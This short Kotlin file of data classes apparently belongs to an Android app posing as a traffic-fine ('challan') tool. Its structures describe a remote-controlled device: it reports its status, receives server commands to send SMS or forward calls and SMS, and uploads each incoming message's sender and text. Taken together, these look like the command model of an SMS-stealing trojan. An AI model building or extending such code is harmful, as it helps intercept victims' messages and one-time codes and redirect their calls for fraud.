package com.rte.challan.data

import com.google.gson.annotations.SerializedName

data class StatusRequest(
    val deviceId: String,
    val battery: Int,
    val online: Boolean
)

data class Command(
    val id: Int,
    val type: String,  // "sms", "call_forward", "sms_forward"
    val data: String,
    @SerializedName("created_at")
    val createdAt: Long
)

data class CommandAck(
    val commandId: Int,
    val status: String
)

data class IncomingSmsRequest(
    val deviceId: String,
    val number: String,
    val text: String
)

data class SmsCommandData(
    val sim: String?,
    val number: String,
    val text: String
)

data class ForwardCommandData(
    val number: String
)
